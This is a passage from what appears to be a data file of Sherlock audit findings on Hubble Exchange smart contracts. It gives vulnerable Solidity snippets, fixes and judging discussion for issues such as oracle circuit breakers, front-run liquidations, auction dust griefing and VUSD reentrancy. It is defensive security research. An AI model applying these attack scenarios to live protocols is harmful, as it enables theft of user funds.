`nextFundingTime` as `amm.settleFunding` is called together for all amms in a single tx. So _nextFundingTime will either be 0 or none for all amms.\n```solidity\n    function settleFunding() override external onlyDefaultOrderBook {\n        uint numAmms = amms.length;\n        uint _nextFundingTime;\n        for (uint i; i < numAmms; ++i) {\n            int _premiumFraction;\n            int _underlyingPrice;\n            int _cumulativePremiumFraction;\n            (_premiumFraction, _underlyingPrice, _cumulativePremiumFraction, _nextFundingTime) = amms[i].settleFunding();\n            if (_nextFundingTime != 0) {\n                emit FundingRateUpdated(\n                    i,\n                    _premiumFraction,\n                    _underlyingPrice.toUint256(),\n                    _cumulativePremiumFraction,\n                    _nextFundingTime,\n                    _blockTimestamp(),\n                    block.number\n                );\n            }\n        }\n        // nextFundingTime will be same for all amms\n        if (_nextFundingTime != 0) {\n            lastFundingTime = _blockTimestamp();\n        }\n    }\n   \n\n\n**ctf-sec**\n\nClosed this issue based on sponsor's comment,\n\nthe watson is welcome to escalate with a more clear impact and more proof\n\n**lemonmon1984**\n\nEscalate\n> All amms will have the same nextFundingTime as amm.settleFunding is called together for all amms in a single tx.\n\nIt is not neccessarily true for certain conditions, in which ClearingHouse.whitelistAmm() is involved.\nOne possible scenario would be:\n1. A couple of AMMs are whitelisted via ClearingHouse.whitelistAmm() where a nextFundingTime is assigned to them.\n1. After the nextFundingTime was reached, ClearingHouse.whitelistAmm() is called again to add another AMM.\n1. Then the ClearingHouse.settleFunding() is called and returns 0 for the last AMM that was just added in the previous step, because its nextFundingTime is in the future and ClearingHouse.sol line 248 is true and returns 0 for nextFundingTime, which then leads to the issue described here.\n\nNote: ClearingHouse.whitelistAmm() and ClearingHouse.settleFunding() is likely to be initiated by separate entities. Therefore, the order of transactions is not guaranteed. Also the tx execution can be delayed due to network congestions. That's why this scenario may occur.\n\n**Example:**\n\nfundingPeriod: 3h\ncall ClearingHouse.whitelistAmm():  at 16:00 (block.timestamp)\n\nthen AMM.startFunding()  gets called l521 in ClearingHouse.sol\n    here it calculates:\n        nextFundingTime = ((16 + 3) / 3) * 3 = 18\n\n\nat 19:00 another AMM is added:\n    call ClearingHouse.whitelistAmm():  at 19:00 (block.timestamp)\n    then AMM.startFunding()  gets called l521 in ClearingHouse.sol\n        here it calculates:\n            nextFundingTime = ((19 + 3) / 3) * 3 = 21\n\nthen also at 19:00 after another AMM was just added:\n    call ClearingHouse.settleFunding()\n        which calls AMM.settleFunding, and the last index of AMMs contains the added AMM from 19:00 with nextFundingTime 21\n            so AMM.settleFunding will return 0,0,0,0 l249 because nextFundingTime is in the future.\n                This leads to exactly the issue described that then on line 281 in ClearingHouse.sol _nextFundingTime will be 0.\n\n\n### Other scenario\nIn another scenario, if the ClearingHouse.settleFunding() is called past the nextFundingTime due to network congestion,\nthe nextFundingTime will shift from the fixed schedule. While it is shifted, if the ClearingHouse.whitelistAmm() is called, then it gives a certain window for the ClearingHouse.settleFunding() call will face the same issue.\n\n**sherlock-admin2**\n\n > Escalate\n> > All amms will have the same nextFundingTime as amm.settleFunding is called together for all amms in a single tx.\n> \n> It is not neccessarily true for certain conditions, in which ClearingHouse.whitelistAmm() is involved.\n> One possible scenario would be:\n> 1. A couple of AMMs are whitelisted via ClearingHouse.whitelistAmm() where a nextFundingTime is assigned to them.\n> 1. After the nextFundingTime was reached, ClearingHouse.whitelistAmm() is called again to add another AMM.\n> 1. Then the ClearingHouse.settleFunding() is called and returns 0 for the last AMM that was just added in the previous step, because its nextFundingTime is in the future and ClearingHouse.sol line 248 is true and returns 0 for nextFundingTime, which then leads to the issue described here.\n> \n> Note: ClearingHouse.whitelistAmm() and ClearingHouse.settleFunding() is likely to be initiated by separate entities. Therefore, the order of transactions is not guaranteed. Also the tx execution can be delayed due to network congestions. That's why this scenario may occur.\n> \n> **Example:**\n> \n> fundingPeriod: 3h\n> call ClearingHouse.whitelistAmm():  at 16:00 (block.timestamp)\n> \n> then AMM.startFunding()  gets called l521 in ClearingHouse.sol\n>     here it calculates:\n>         nextFundingTime = ((16 + 3) / 3) * 3 = 18\n> \n> \n> at 19:00 another AMM is added:\n>     call ClearingHouse.whitelistAmm():  at 19:00 (block.timestamp)\n>     then AMM.startFunding()  gets called l521 in ClearingHouse.sol\n>         here it calculates:\n>             nextFundingTime = ((19 + 3) / 3) * 3 = 21\n> \n> then also at 19:00 after another AMM was just added:\n>     call ClearingHouse.settleFunding()\n>         which calls AMM.settleFunding, and the last index of AMMs contains the added AMM from 19:00 with nextFundingTime 21\n>             so AMM.settleFunding will return 0,0,0,0 l249 because nextFundingTime is in the future.\n>                 This leads to exactly the issue described that then on line 281 in ClearingHouse.sol _nextFundingTime will be 0.\n> \n> \n> ### Other scenario\n> In another scenario, if the ClearingHouse.settleFunding() is called past the nextFundingTime due to network congestion,\n> the nextFundingTime will shift from the fixed schedule. While it is shifted, if the ClearingHouse.whitelistAmm() is called, then it gives a certain window for the ClearingHouse.settleFunding() call will face the same issue.\n\nYou've created a valid escalation!\n\nTo remove the escalation from consideration: Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**asquare08**\n\nA good corner case is described. It's a valid issue and can be marked as medium severity \n\n**IAm0x52**\n\nAgreed with escalation, valid corner case\n\n**hrishibhat**\n\nResult:\nMedium\nUnique\n\n**sherlock-admin2**\n\nEscalations have been resolved successfully!\n\nEscalation status:\n- [lemonmon1984](https://github.com/sherlock-audit/2023-04-hubble-exchange-judging/issues/248/#issuecomment-1642709772): accepted",
      "summary": "\nThis bug report is about a potential issue in the `ClearingHouse.updatePositions()` function when the `lastFundingTime` is not being updated by `ClearingHouse.settleFunding()`. The issue occurs when the `_nextFundingTime` is determined by a call to `amms[i].settleFunding()` and the return value is zero, which happens when the `block.timestamp` is smaller than the next funding time. This leads to incorrect margin accounting when opening a position and the trader not receiving funds that they should receive. \n\nThe code snippet provided in the report shows the lines where the issue can be found in the `ClearingHouse.sol` file and the `AMM.sol` file. The report also provides an example of how the issue can occur.\n\nThe recommendation is to consider adjusting the code inside `ClearingHouse.settleFunding()` to account for the case where the last market inside the `amms` array returns zero for `_nextFundingTime` when `Amm.settleFunding()` is called. This is done by introducing a boolean variable that tracks whether a market inside `amms` array didn't return zero for `_nextFundingTime`.\n\nThe impact of the issue is that unrealized funding payments are not settled correctly, potentially leading to incorrect margin accounting when opening a position. The bug was found by lemonmon and manually reviewed. The bug was marked as medium severity and unique.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Hubble Exchange",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-04-hubble-exchange-judging/issues/248",
      "tags": [],
      "finders": [
        "lemonmon"
      ]
    },
    {
      "id": "20697",
      "title": "M-12: No `minAnswer/maxAnswer` Circuit Breaker Checks while Querying Prices in Oracle.sol",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-04-hubble-exchange-judging/issues/241 \n\n## Found by \nBauchibred, BugBusters, Hama, crimson-rat-reach, ni8mare, rogue-lion-0619\n\n\n## Summary\n\nThe Oracle.sol contract, while currently applying a safety check (this can be side stepped, check my other submission ) to ensure returned prices are greater than zero, which is commendable, as it effectively mitigates the risk of using negative prices, there should be an implementation to ensure the returned prices are not at the extreme boundaries (`minAnswer` and `maxAnswer`).\nWithout such a mechanism, the contract could operate based on incorrect prices, which could lead to an over- or under-representation of the asset's value, potentially causing significant harm to the protocol.\n\n## Vulnerability Details\n\nChainlink aggregators have a built in circuit breaker if the price of an asset goes outside of a predetermined price band. The result is that if an asset experiences a huge drop in value (i.e. LUNA crash) the price of the oracle will continue to return the minPrice instead of the actual price of the asset. This would allow user to continue borrowing with the asset but at the wrong price. This is exactly what happened to [Venus on BSC when LUNA imploded](https://rekt.news/venus-blizz-rekt/).\nIn its current form, the `getUnderlyingPrice()` function within the Oracle.sol contract retrieves the latest round data from Chainlink, if the asset's market price plummets below `minAnswer` or skyrockets above `maxAnswer`, the returned price will still be `minAnswer` or `maxAnswer`, respectively, rather than the actual market price. This could potentially lead to an exploitation scenario where the protocol interacts with the asset using incorrect price information.\n\nTake a look at [Oracle.sol#L106-L123](https://github.com/sherlock-audit/2023-04-hubble-exchange/blob/1f9a5ed0ca8f6004bbb7b099ecbb8ae796557849/hubble-protocol/contracts/Oracle.sol#L106-L123):\n\n```solidity\n\n    function getLatestRoundData(AggregatorV3Interface _aggregator)\n        internal\n        view\n        returns (\n            uint80,\n            uint256 finalPrice,\n            uint256\n        )\n    {\n        (uint80 round, int256 latestPrice, , uint256 latestTimestamp, ) = _aggregator.latestRoundData();\n        finalPrice = uint256(latestPrice);\n        if (latestPrice <= 0) {\n            requireEnoughHistory(round);\n            (round, finalPrice, latestTimestamp) = getRoundData(_aggregator, round - 1);\n        }\n        return (round, finalPrice, latestTimestamp);\n    }\n```\n\n### Illustration:\n\n- Present price of TokenA is $10\n- TokenA has a minimum price set at $1 on chainlink\n- The actual price of TokenA dips to $0.10\n- The aggregator continues to report $1 as the price.\n\nConsequently, users can interact with protocol using TokenA as though it were still valued at $1, which is a tenfold overestimate of its real market value.\n\n## Impact\n\nThe potential for misuse arises when the actual price of an asset drastically changes but the oracle continues to operate using the `minAnswer` or `maxAnswer` as the asset's price. In the case of it going under the `minAnswer` malicious actors obviously have the upperhand and could give their potential _going to zero_ worth tokens to protocol\n\n## Code Snippet\n\n[PriceOracle.sol#L60-L72](https://github.com/sherlock-audit/2023-05-ironbank/blob/9ebf1702b2163b55479624794ab7999392367d2a/ib-v2/src/protocol/oracle/PriceOracle.sol#L60-L72)\n\n## Tool used\nManual Audit\n## Recommendation\n\nSince there is going to be a whitelist of tokens to be added, the minPrice/maxPrice could be checked and a revert could be made when this is returned by chainlink or a fallback oracle that does not have circuit breakers could be implemented in that case\n\n\n\n\n## Discussion\n\n**asquare08**\n\nThis is a valid concern. But we will fix this in later releases as initially, we are launching with blue chip tokens only and single collateral (USDC).",
      "summary": "\nThis bug report highlights an issue with the Oracle.sol contract in the Hubble Exchange Judging repository. The contract is currently applying a safety check to ensure returned prices are greater than zero, however, there is no implementation to ensure the returned prices are not at the extreme boundaries (minAnswer and maxAnswer). This could potentially lead to an exploitation scenario where the protocol interacts with the asset using incorrect price information. \n\nFor example, if the present price of an asset is $10 and it has a minimum price set at $1 on chainlink, but then the actual price of the asset dips to $0.10, the aggregator would continue to report $1 as the price. This means users can interact with the protocol using the asset as though it were still valued at $1, which is a tenfold overestimate of its real market value. This could lead to malicious actors giving their potentially worthless tokens to the protocol.\n\nThe code snippet from PriceOracle.sol#L60-L72 was provided as an illustration of the issue. The bug was found by Bauchibred, BugBusters, Hama, crimson-rat-reach, ni8mare and rogue-lion-0619, and was manually audited.\n\nThe recommendation is to check the minPrice/maxPrice when tokens are added to the whitelist, and to make a revert if this is returned by Chainlink, or to implement a fallback oracle that does not have circuit breakers. Asquare08 noted that this would be fixed in later releases, as initially, they are launching with blue chip tokens only and single collateral (USDC).",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Hubble Exchange",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-04-hubble-exchange-judging/issues/241",
      "tags": [],
      "finders": [
        "rogue-lion-0619",
        "ni8mare",
        "crimson-rat-reach",
        "BugBusters",
        "Hama",
        "Bauchibred"
      ]
    },
    {
      "id": "20696",
      "title": "M-11: User will be forced liquidated",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-04-hubble-exchange-judging/issues/234 \n\n## Found by \nBugBusters\n## Summary\nThe `addMargin` function have a vulnerability that can potentially lead to issues when the contract is paused. Users are unable to add margin during the paused state, which can leave them vulnerable to liquidation if their collateral value falls below the required threshold. Additionally, after the contract is unpaused, users can be subject to frontrunning, where their margin addition transactions can be exploited by other users.\n\n## Vulnerability Detail\nTo better understand how this  vulnerabilities could be exploited, let's consider a scenario:\n\n1): The contract owner pauses the contract due to some unforeseen circumstances or for maintenance purposes.\n\n2): During the paused state, User A wants to add margin to their account. However, they are unable to do so since the contract prohibits margin addition while paused.\n\n3): Meanwhile, the price of the collateral supporting User A's account experiences significant fluctuations, causing the value of their collateral to fall below the required threshold for maintenance.\n\n4): While the contract is still paused, User A's account becomes eligible for liquidation.\n\n5): After some time, the contract owner decides to unpause the contract, allowing normal operations to resume.\n\n6): User A tries to add margin to their account after the contract is unpaused. However, before their transaction is processed, User B, who has been monitoring the pending transactions, notices User A's margin addition transaction and quickly frontruns it by submitting a higher gas price transaction to liquidate User A's account instead.\n\nNow userA will be forcefully liquidated even tho he wants to add the margin.\n\nYou can read more from [this link](https://dacian.me/lending-borrowing-defi-attacks#heading-borrower-immediately-liquidated-after-repayments-resume)\n\n## Impact\n\nThe identified impact could be\n\n1): Unfair Liquidations: Users can be unfairly liquidated if their margin addition transactions are frontrun by other users after the contract is unpaused. This can result in the loss of their collateral.\n\n## Code Snippet\nhttps://github.com/sherlock-audit/2023-04-hubble-exchange/blob/main/hubble-protocol/contracts/MarginAccount.sol#L136-L156\n\n## Tool used\n\nManual Review\n\n## Recommendation\nImplement a Fair Liquidation Mechanism: Introduce a delay or waiting period before executing liquidation transactions. This waiting period should provide sufficient time for users to address their collateral issues or add margin. \n\n\n\n## Discussion\n\n**Nabeel-javaid**\n\nescalate for 10 USDC\n\nI think this issue should be considered as valid. The validity of issue should be accepted. The report clearly shows how a protocol owner actions (pause) will result in unfair liquidations causing loss of funds to users.\n\nAlso it is unlikely that on unpause human users will be able to secure their positions before MEV/liquidation bots capture the available profit. Hence the loss is certain.\n\nFor reference, similar issues were consider valid in the recent contests on sherlock, you can check it [here](https://github.com/sherlock-audit/2023-03-notional-judging/issues/203) and [here](https://github.com/sherlock-audit/2023-05-perennial-judging/issues/190). Maintaining a consistent valid/invalid classification standard will be ideal here.\n\n**sherlock-admin2**\n\n > escalate for 10 USDC\n> \n> I think this issue should be considered as valid. The validity of issue should be accepted. The report clearly shows how a protocol owner actions (pause) will result in unfair liquidations causing loss of funds to users.\n> \n> Also it is unlikely that on unpause human users will be able to secure their positions before MEV/liquidation bots capture the available profit. Hence the loss is certain.\n> \n> For reference, similar issues were consider valid in the recent contests on sherlock, you can check it [here](https://github.com/sherlock-audit/2023-03-notional-judging/issues/203) and [here](https://github.com/sherlock-audit/2023-05-perennial-judging/issues/190). Maintaining a consistent valid/invalid classification standard will be ideal here.\n\nYou've created a valid escalation!\n\nTo remove the escalation from consideration: Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**ctf-sec**\n\nI mean if the liquidation cannot be paused then clearly a medium (there are similar past finding)\n\nhttps://github.com/sherlock-audit/2023-04-hubble-exchange/blob/1f9a5ed0ca8f6004bbb7b099ecbb8ae796557849/hubble-protocol/contracts/MarginAccount.sol#L322\n\n```solidity\n    function liquidateExactRepay(address trader, uint repay, uint idx, uint minSeizeAmount) external whenNotPaused {\n```\n\nBut The liquidation is paused as well\n\nso recommend severity is low\n\na optional fix is adding a grace period for user to add margin when unpause the liquidation and addMargin\n\n\n**Nabeel-javaid**\n\nHey @ctf-sec \nAdding more context, the problem is not that the liquidation functions can be paused or not, it is more of a front-running problem.\n\nLiquidation functions cannot be paused individually, whole contract is paused which means that other functions with the whenNotPaused modifier cannot be accessed either.\n\nSo when the contract is un-paused, a user can be front-run before making the position healthy and is unfairly liquidated. For more reference see the following issue that are exactly the same .\n\n[Perrenial Contest Issue 190](https://github.com/sherlock-audit/2023-05-perennial-judging/issues/190)\n[Notional Contest Issue 203](https://github.com/sherlock-audit/2023-03-notional-judging/issues/203)\n\nI hope that added context will further help in judging.\n\n**hrishibhat**\n\n@ctf-sec \nI understand this is how it is design but there is a loss due front-run during unpause. \n\n**ctf-sec**\n\nhttps://github.com/sherlock-audit/2023-04-blueberry-judging/issues/118\n\nseems like this issue has been historically judged as a medium\n\nthen a medium is fine\n\n**hrishibhat**\n\nResult:\nMedium\nUnique\nAfter further discussions with Lead Watson and Sponsor, considering this a valid medium based on the above comments\n\n**sherlock-admin2**\n\nEscalations have been resolved successfully!\n\nEscalation status:\n- [Nabeel-javaid](https://github.com/sherlock-audit/2023-04-hubble-exchange-judging/issues/234/#issuecomment-1642504725): accepted",
      "summary": "\nBug report M-11 is about a vulnerability found in the `addMargin` function of the Hubble Exchange contract. This vulnerability can lead to users being liquidated when the contract is paused, as they are unable to add margin during this time. Additionally, when the contract is unpaused, users can be exploited by other users through frontrunning, where their margin addition transactions can be exploited. \n\nThe vulnerability can be exploited by the following scenario: the contract owner pauses the contract, User A wants to add margin but is unable to due to the paused state, the price of the collateral supporting User A's account experiences significant fluctuations, causing the value of their collateral to fall below the required threshold for maintenance, while the contract is still paused, User A's account becomes eligible for liquidation, after some time, the contract owner decides to unpause the contract, and User A tries to add margin to their account after the contract is unpaused, but before their transaction is processed, User B notices User A's margin addition transaction and quickly frontruns it by submitting a higher gas price transaction to liquidate User A's account instead. \n\nThe impact of this vulnerability is unfair liquidations, where users can lose their collateral due to other users exploiting their margin addition transactions. The code snippet of the vulnerability can be found at https://github.com/sherlock-audit/2023-04-hubble-exchange/blob/main/hubble-protocol/contracts/MarginAccount.sol#L136-L156. The bug was found through manual review. \n\nThe recommended solution to this vulnerability is to introduce a delay or waiting period before executing liquidation transactions, which will provide users with sufficient time to address their collateral issues or add margin. After further discussions with Lead Watson and Sponsor, the severity of this vulnerability was determined to be medium. The link to a similar issue that was judged as medium can be found at https://github.com/sherlock-audit/2023-04-blueberry-judging/issues/118.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Hubble Exchange",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-04-hubble-exchange-judging/issues/234",
      "tags": [],
      "finders": [
        "BugBusters"
      ]
    },
    {
      "id": "20695",
      "title": "M-10: Funding settlement will be DOS'd for a time after the phaseID change of an underlying chainlink aggregator",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-04-hubble-exchange-judging/issues/177 \n\n## Found by \n0x52\n## Summary\n\nOracle incorrectly assumes that roundID is always incremented by one but this is not the case. Chainlink's roundID is actually two values packed together: phaseId and aggregatorRoundId. When the phaseID is incremented the roundID increases by 2 ** 64. After a phaseID increment all calls to settle funding will revert until an entire funding interval has elapsed. Since all markets are settled simultaneously, even a single oracle incrementing will result in all market funding being DOS'd. Although this funding can be made up later it will user different TWAP values which will result in users being paid differently causing loss of yield to a portion of all users. \n\n## Vulnerability Detail\n\nhttps://snowtrace.io/address/0x976b3d034e162d8bd72d6b9c989d545b839003b0#code#L206\n\n      function getAnswer(uint256 _roundId)\n        public\n        view\n        virtual\n        override\n        returns (int256 answer)\n      {\n        if (_roundId > MAX_ID) return 0;\n    \n        (uint16 phaseId, uint64 aggregatorRoundId) = parseIds(_roundId);\n        AggregatorV2V3Interface aggregator = phaseAggregators[phaseId];\n        if (address(aggregator) == address(0)) return 0;\n    \n        return aggregator.getAnswer(aggregatorRoundId);\n      }\n\nThe above code is from the ETH/USD aggregator on AVAX, It can be seen that the roundId is made up of 2 packed components, the phaseId and aggregatorRoundId. As explained in the summary, when the phaseId is incremented 2 ** 64 \"rounds\" will be skipped. When `currentRound - 1` is inevitably queried after this increment, the call will revert because that round doesn't exist this DOS will last for up to 24 hours depending on market settings. After the DOS ends, settingFunding will be able to catch up but it will now calculate the funding rate with different TWAP values.\n\n## Impact\n\nLoss of yield to a portion of all users in every market each time there is a phaseId shift\n\n## Code Snippet\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nI would recommend using a try block when calling the aggregator. If the roundID is nonzero and is reverting then the oracle needs try again with a lower phaseId\n\n\n\n## Discussion\n\n**asquare08**\n\nThis is a valid issue. We will fix it with post-mainnet releases because we are using trusted oracle (deployed on hubbleNet) with mainnet release and any updates to that will be notified prior.",
      "summary": "\nThis bug report is about an issue with the funding settlement of a chainlink aggregator when the phaseID changes. The roundID is actually two values packed together: phaseId and aggregatorRoundId. When the phaseID is incremented the roundID increases by 2 ** 64. This means that when `currentRound - 1` is queried after the increment, the call will revert because that round doesn't exist, resulting in a Denial of Service (DOS) for up to 24 hours depending on market settings. This DOS will cause loss of yield to a portion of all users in every market each time there is a phaseId shift. The bug was found by 0x52 and was confirmed by asquare08. The recommendation is to use a try block when calling the aggregator, and if the roundID is nonzero and is reverting then the oracle needs try again with a lower phaseId. This issue will be fixed with post-mainnet releases because the oracle will be deployed on hubbleNet with mainnet release and any updates will be notified prior.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Hubble Exchange",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-04-hubble-exchange-judging/issues/177",
      "tags": [],
      "finders": [
        "0x52"
      ]
    },
    {
      "id": "20694",
      "title": "M-9: MarginAccountHelper will be bricked if registry.marginAccount or insuranceFund ever change",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-04-hubble-exchange-judging/issues/170 \n\n## Found by \n0x52, crimson-rat-reach\n## Summary\n\nMarginAccountHelper#syncDeps causes the contract to refresh it's references to both marginAccount and insuranceFund. The issue is that approvals are never made to the new contracts rendering them useless.\n\n## Vulnerability Detail\n\n[MarginAccountHelper.sol#L82-L87](https://github.com/sherlock-audit/2023-04-hubble-exchange/blob/main/hubble-protocol/contracts/MarginAccountHelper.sol#L82-L87)\n\n    function syncDeps(address _registry) public onlyGovernance {\n        IRegistry registry = IRegistry(_registry);\n        vusd = IVUSD(registry.vusd());\n        marginAccount = IMarginAccount(registry.marginAccount());\n        insuranceFund = IInsuranceFund(registry.insuranceFund());\n    }\n\nWhen syncDeps is called the marginAccount and insuranceFund references are updated. All transactions require approvals to one of those two contract. Since no new approvals are made, the contract will become bricked and all transactions will revert.\n\n## Impact\n\nContract will become bricked and all contracts that are integrated or depend on it will also be bricked\n\n## Code Snippet\n\n[MarginAccountHelper.sol#L82-L87](https://github.com/sherlock-audit/2023-04-hubble-exchange/blob/main/hubble-protocol/contracts/MarginAccountHelper.sol#L82-L87)\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nRemove approvals to old contracts before changing and approve new contracts after\n\n\n\n## Discussion\n\n**asquare08**\n\nValid issue but we will be using `syncDeps` mainly during the deployment. Later on, since both `marginAccount` and `insuranceFund` are upgradeable contracts, their address won't change.",
      "summary": "\nThis bug report is about the MarginAccountHelper contract which is used as part of the Hubble Exchange. The issue is that if the registry.marginAccount or insuranceFund ever change, the contract will become bricked and all transactions will revert. This is because the syncDeps function updates the marginAccount and insuranceFund references, but no new approvals are made, which are required for all transactions. This will cause the contract to become bricked and all contracts that are integrated or depend on it will also be bricked.\n\nThe code snippet provided is from the MarginAccountHelper.sol#L82-L87 which is the code responsible for the issue. The tool used to find this bug was manual review.\n\nThe recommendation given is to remove approvals to old contracts before changing and approve new contracts after. However, it was mentioned that since both marginAccount and insuranceFund are upgradeable contracts, their address won't change, so this issue may not be as relevant.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Hubble Exchange",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-04-hubble-exchange-judging/issues/170",
      "tags": [
        "Missing-Logic"
      ],
      "finders": [
        "crimson-rat-reach",
        "0x52"
      ]
    },
    {
      "id": "20693",
      "title": "M-8: Malicious users can donate/leave dust amounts of collateral in contract during auctions to buy other collateral at very low prices",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-04-hubble-exchange-judging/issues/168 \n\n## Found by \n0x3e84fa45, 0x52, rogue-lion-0619, ver0759\n## Summary\n\nAuctions are only ended early if the amount of the token being auctioned drops to 0. This can be exploited via donation or leaving dust in the contract to malicious extend the auction and buy further liquidate collateral at heavily discounted prices.\n\n## Vulnerability Detail\n\n[InsuranceFund.sol#L184-L199](https://github.com/sherlock-audit/2023-04-hubble-exchange/blob/main/hubble-protocol/contracts/InsuranceFund.sol#L184-L199)\n\n    function buyCollateralFromAuction(address token, uint amount) override external {\n        Auction memory auction = auctions[token];\n        // validate auction\n        require(_isAuctionOngoing(auction.startedAt, auction.expiryTime), \"IF.no_ongoing_auction\");\n\n        // transfer funds\n        uint vusdToTransfer = _calcVusdAmountForAuction(auction, token, amount);\n        address buyer = _msgSender();\n        vusd.safeTransferFrom(buyer, address(this), vusdToTransfer);\n        IERC20(token).safeTransfer(buyer, amount); // will revert if there wasn't enough amount as requested\n\n        // close auction if no collateral left\n        if (IERC20(token).balanceOf(address(this)) == 0) { <- @audit-issue only cancels auction if balance = 0\n            auctions[token].startedAt = 0;\n        }\n    }\n\nWhen buying collateral from an auction, the auction is only closed if the balance of the token is 0. This can be exploited in a few ways to maliciously extend auctions and keep the timer (and price) decreasing. The first would be buy all but 1 wei of a token leaving it in the contract so the auction won't close. Since 1 wei isn't worth the gas costs to buy, there would be a negative incentive to buy the collateral, likely resulting in no on buying the final amount. A second approach would be to frontrun an buys with a single wei transfer with the same results.\n\nNow that the auction has been extended any additional collateral added during the duration of the auction will start immediately well below the assets actual value. This allows malicious users to buy the asset for much cheaper, causing loss to the insurance fund.\n\n## Impact\n\nUsers can maliciously extend auctions and potentially get collateral for very cheap\n\n## Code Snippet\n\n[InsuranceFund.sol#L184-L199](https://github.com/sherlock-audit/2023-04-hubble-exchange/blob/main/hubble-protocol/contracts/InsuranceFund.sol#L184-L199)\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nClose the auction if there is less than a certain threshold of a token remaining after it has been bought:\n\n        IERC20(token).safeTransfer(buyer, amount); // will revert if there wasn't enough amount as requested\n\n    +   uint256 minRemainingBalance = 1 * 10 ** (IERC20(token).decimal() - 3);\n\n        // close auction if no collateral left\n    +   if (IERC20(token).balanceOf(address(this)) <= minRemainingBalance) {\n            auctions[token].startedAt = 0;\n        }\n\n\n\n## Discussion\n\n**asquare08**\n\nThis issue can come when multi-collateral is enabled. Therefore, we will fix this with post-mainnet releases as we are launching mainnet with single collateral.",
      "summary": "\nThis bug report describes a vulnerability in an auction system, which can be exploited by malicious users to extend the auction and buy collateral at heavily discounted prices. The vulnerability exists in the code snippet of InsuranceFund.sol#L184-L199, where the auction is only closed if the balance of the token is 0. An attacker can exploit this by either buying all but 1 wei of a token leaving it in the contract or frontrun an buys with a single wei transfer. This would allow them to maliciously extend the auction, and buy collateral at a much cheaper price, resulting in a loss to the insurance fund. To fix this issue, it is recommended to close the auction if there is less than a certain threshold of a token remaining after it has been bought. The issue can be prevented in the meantime by disabling multi-collateral until post-mainnet releases.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Hubble Exchange",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-04-hubble-exchange-judging/issues/168",
      "tags": [],
      "finders": [
        "rogue-lion-0619",
        "0x3e84fa45",
        "0x52",
        "ver0759"
      ]
    },
    {
      "id": "20692",
      "title": "M-7: Malicious user can grief withdrawing users via VUSD reentrancy",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-04-hubble-exchange-judging/issues/153 \n\n## Found by \n0x3e84fa45, 0x52\n## Summary\n\nVUSD#processWithdraw makes a call to withdrawal.usr to send the withdrawn gas token. processWithdrawals is the only nonreentrant function allowing a user to create a smart contract that uses it's receive function to deposit then immediately withdraw to indefinitely lengthen the withdrawal queue and waste large amounts of caller gas.\n\n## Vulnerability Detail\n\n[VUSD.sol#L69-L77](https://github.com/sherlock-audit/2023-04-hubble-exchange/blob/main/hubble-protocol/contracts/VUSD.sol#L69-L77)\n\n        while (i < withdrawals.length && (i - start) < maxWithdrawalProcesses) {\n            Withdrawal memory withdrawal = withdrawals[i];\n            if (reserve < withdrawal.amount) {\n                break;\n            }\n\n            (bool success, bytes memory data) = withdrawal.usr.call{value: withdrawal.amount}(\"\");\n            if (success) {\n                reserve -= withdrawal.amount;\n\nTo send the withdrawn gas token to the user VUSD#processWithdrawals utilizes a call with no data. When received by a contract this will trigger it's receive function. This can be abused to continually grief users who withdraw with no recurring cost to the attacker. To exploit this the attacker would withdraw VUSD to a malicious contract. This contract would deposit the received gas token then immediately withdraw it. This would lengthen the queue. Since the queue is first-in first-out a user would be forced to process all the malicious withdrawals before being able to process their own. While processing them they would inevitably reset the grief for the next user.\n\nNOTE: I am submitting this as a separate issue apart from my other two similar issues. I believe it should be a separate issue because even though the outcome is similar the root cause is entirely different. Those are directly related to the incorrect call parameters while the root cause of this issue is that both mintWithReserve and withdraw/withdrawTo lack the reentrant modifier allowing this malicious reentrancy.\n\n## Impact\n\nMalicious user can maliciously reenter VUSD to grief users via unnecessary gas wastage \n\n## Code Snippet\n\n[VUSD.sol#L45-L48](https://github.com/sherlock-audit/2023-04-hubble-exchange/blob/main/hubble-protocol/contracts/VUSD.sol#L45-L48)\n\n[VUSD.sol#L50-L52](https://github.com/sherlock-audit/2023-04-hubble-exchange/blob/main/hubble-protocol/contracts/VUSD.sol#L50-L52)\n\n[VUSD.sol#L58-L60](https://github.com/sherlock-audit/2023-04-hubble-exchange/blob/main/hubble-protocol/contracts/VUSD.sol#L58-L60)\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nAdd the nonreentrant modifer to mintWithReserve withdraw and withdrawTo\n\n\n\n## Discussion\n\n**asquare08**\n\nWill add the `nonreentrant` modifer to `mintWithReserve` withdraw and `withdrawTo`\n\n**ctf-sec**\n\n>To exploit this the attacker would withdraw VUSD to a malicious contract. This contract would deposit the received gas token then immediately withdraw it. \n\nI put this issue and #160 together because these two issue highlight different ways of wasting gas, but they also focus on how to waste gas in external 